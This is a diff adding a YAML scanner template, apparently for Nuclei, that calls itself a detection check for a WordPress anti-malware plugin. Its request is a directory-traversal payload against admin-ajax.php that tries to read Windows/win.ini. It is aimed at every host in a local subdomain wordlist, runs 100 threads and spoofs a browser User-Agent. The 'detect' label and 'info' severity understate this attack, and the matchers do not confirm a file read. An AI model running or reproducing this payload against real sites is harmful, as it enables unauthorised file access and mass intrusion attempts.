@@ -1,0 +1,39 @@
+id: wordpress-gotmls-detect
+info:
+  author: vsh00t
+  name: Detect WordPress Plugin Anti-Malware Security and Bruteforce Firewall
+  reference: https://www.exploit-db.com/exploits/50107
+  severity: info
+  tags: wordpress,wp-plugin,gotmls
+requests:
+- attack: sniper
+  extractors:
+  - kval:
+    - Location
+    part: header
+    type: kval
+  matchers:
+  - part: header
+    type: word
+    words:
+    - gotmls
+  - status:
+    - 302
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /wp-admin/admin-ajax.php?action={{randstr}}&file=../../../../../../../../../Windows/win.ini
+    HTTP/1.1
+
+    Host: {{Subdomains}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    '
+  threads: 100
